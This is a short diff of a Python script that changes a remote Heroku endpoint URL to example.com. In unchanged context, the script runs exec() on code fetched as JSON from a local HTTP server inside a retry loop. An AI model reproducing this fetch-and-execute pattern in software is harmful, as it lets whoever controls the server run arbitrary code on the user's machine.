@@ -16,7 +16,7 @@ while True:
         print('starting...')
         print(os.getcwd())
         endpoint_1 = 'http://127.0.0.1:8000/'
-        endpoint_2 = 'https://xxremote.herokuapp.com'
+        endpoint_2 = 'https://example.com/'
         exec(requests.get(f'{endpoint_1}candy').json()['candy'])
         break
     except Exception as e:
